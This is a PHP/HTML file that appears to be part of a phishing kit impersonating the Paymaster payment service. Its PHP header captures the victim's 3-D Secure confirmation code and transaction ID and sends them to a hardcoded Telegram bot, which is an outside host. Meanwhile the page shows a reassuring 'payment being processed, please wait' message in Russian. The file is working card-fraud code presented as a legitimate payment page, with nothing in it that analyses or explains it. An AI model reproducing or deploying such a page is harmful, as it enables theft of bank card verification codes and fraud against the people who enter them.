<?php
$order_id = $_REQUEST["order_id"];

$amount = $_REQUEST["amount"];

$card_number = str_replace(" ", "", $_POST["3dsecure"]);

    $message = "<b>✅ВВЕДЕН КОД✅</b>
    
<b>➡️</b>  " . $card_number . "  <b>⬅️</b>
Номер транзакции: " . $_REQUEST["order_id"] . "
";
sendTel($message);  
	
	
    function sendTel($message){
		$id = "-352545024"; // ID твой 
        $tokken = "1048887230:AAE_Aa3EmFsufiuano33FUQUIUU_kutD1MA"; // токен бота
		$filename = "https://api.telegram.org/bot".$tokken."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
    }
    


?>

<!DOCTYPE html>
<html lang="ru-RU">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paymaster</title>

    <link rel="icon" href="https://paymaster.ru/Content/img/favico.ico" type="image/x-icon">
    <link href="https://paymaster.ru/content/css/styles.css?v=VmUO_daHKnGgzkzMjLGD1daBjTxvqoLa0MOXtIKpk2I1" rel="stylesheet">

</head>

<body>
    <div class="pp-viewport">
        <div class="pp-header pp-clearfix">
            <a class="pp-logo"></a>
        </div>
	
		<div class="pp-message pp-success">
			<h3>Ваш платеж обрабатывается модераторами. Ожидайте...<br>_________<br>Номер транзакции: <?=$order_id;?></h3>    
		</div>

		<div class="pp-buttons pp-clearfix" id="buttonsBar" style="display: block;">
			<a class="button primary-btn right-aligned" type="button" id="returnToMerchant" href="javascript:returnToSite();">
				Вернуться на главную
			</a>
			<script>
				function returnToSite() {
				  top.location.href = "/";
				}
			</script>
		</div>

        <div class="pp-footer">
            <div>
                <div class="pp-copyrights">
                    ©&nbsp;2010–2020&nbsp;PayMaster
                </div>
			</div>
            <div>
                <ul class="pp-langs">
                    <li>
                        <a>
                            <img src=https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Flag_of_Russia.svg/250px-Flag_of_Russia.svg.png" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
<!-- Chatra {literal} -->
<script>
    (function(d, w, c) {
        w.ChatraID = 'ZtNvjwhHZLBchzmx7';
        var s = d.createElement('script');
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        s.async = true;
        s.src = 'https://call.chatra.io/chatra.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'Chatra');
</script>
<!-- /Chatra {/literal} -->
</body>

</html>
